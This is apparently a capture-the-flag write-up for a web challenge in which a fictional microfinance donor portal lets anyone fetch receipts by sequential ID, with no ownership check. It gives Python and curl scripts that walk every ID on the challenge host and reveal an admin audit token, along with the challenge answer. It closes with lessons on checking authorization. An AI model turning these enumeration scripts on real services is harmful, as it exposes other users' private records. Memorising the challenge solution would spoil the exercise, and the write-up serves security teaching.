# Microfinance IDOR

**Category:** `Web / Insecure Direct Object Reference (IDOR)`  

## Challenge Overview

KivaConnect's donor portal lets a logged-in donor pull receipts by ID. The ID column is sequential and nothing in the API checks who issued which receipt. A naive enumeration finds an admin audit token hidden in one of the receipts.

## Given Information

- **API:** `https://hackforachangeruntime.vercel.app/api/microfinance-idor?seed=<seed>`
- **Seed:** `894973d1bb37394d4b1c288a7419d6c15802efc13c5dccb2058c8454ae24a5ed`
- **Challenge page:** `https://hackforachangeruntime.vercel.app/r/7fa3677f-83a7-4511-8873-3a3b1db41d01/microfinance-idor?token=<token>`
- **Hints:**
  1. Receipts are sequential. The server does not check who owns each ID.
  2. Skim notes — most receipts are routine. One is not.
  3. You don't need 100 individual clicks. Script it.

## Root Cause

The receipt endpoint accepts an `id` parameter but performs no authorization check — any ID can be queried without proving ownership. This is a textbook **Insecure Direct Object Reference (IDOR)** vulnerability.

Although the endpoint description mentions "Access controls are scoped per-donor session," the access control is never actually enforced on the receipt retrieval action.

## Solution

### Step 1: Understand the API

```
GET ?action=receipt&id=<int 1-100>
```

Returns a JSON receipt object with fields: `id`, `donor`, `program`, `amount_usd`, `issued_at`, and `note`.

### Step 2: Enumerate All Receipts

Since there are only 100 receipts (IDs 1–100), a simple loop fetches every receipt and inspects the `note` field for the `ADMIN_AUDIT_TOKEN` string.

```python
import json, urllib.request

SEED = "894973d1bb37394d4b1c288a7419d6c15802efc13c5dccb2058c8454ae24a5ed"
BASE = f"https://hackforachangeruntime.vercel.app/api/microfinance-idor?seed={SEED}&action=receipt&id="

for i in range(1, 101):
    resp = urllib.request.urlopen(BASE + str(i))
    data = json.loads(resp.read())
    note = data["receipt"]["note"]
    if "ADMIN_AUDIT_TOKEN" in note:
        print(f"ID {i}: {data}")
        break
```

Or with `curl` and a one-liner:

```bash
for i in $(seq 1 100); do
  curl -s "https://hackforachangeruntime.vercel.app/api/microfinance-idor?seed=894973d1bb37394d4b1c288a7419d6c15802efc13c5dccb2058c8454ae24a5ed&action=receipt&id=$i" | python3 -c "import sys,json; d=json.load(sys.stdin); n=d['receipt']['note']; print(f'ID {d[\"receipt\"][\"id\"]}: {n}')"
done
```

### Step 3: Identify the Interesting Receipt

Most receipts have the same boilerplate note:

```
Receipt issued. Disbursed via beneficiary wallet.
```

Receipt **ID 99** is different:

```json
{
  "ok": true,
  "receipt": {
    "id": 99,
    "donor": "Admin Audit Account",
    "program": "Internal Audit Routing",
    "amount_usd": 0,
    "issued_at": "2026-04-02T12:00:00Z",
    "note": "ADMIN_AUDIT_TOKEN: 32fdbb7cb366083df8adc0631c65dad1"
  }
}
```

### Step 4: Submit the Token

Enter the dispatch token `32fdbb7cb366083df8adc0631c65dad1` into the "Claim Flag" button on the challenge page to receive the flag.

## Key Takeaways

- **IDOR vulnerabilities** occur when an application exposes direct object references (like database IDs) without verifying the requesting user's authorization.
- Sequential, predictable IDs make enumeration trivial.
- Always check authorization server-side — hiding IDs or using "hard-to-guess" values is not a security control.
- The description mentioned "Access controls are scoped per-donor session" but this was never implemented, illustrating the gap between documented security and actual enforcement.

## Files

- `solve.py` — Python script that enumerates all 100 receipts and prints the admin audit token
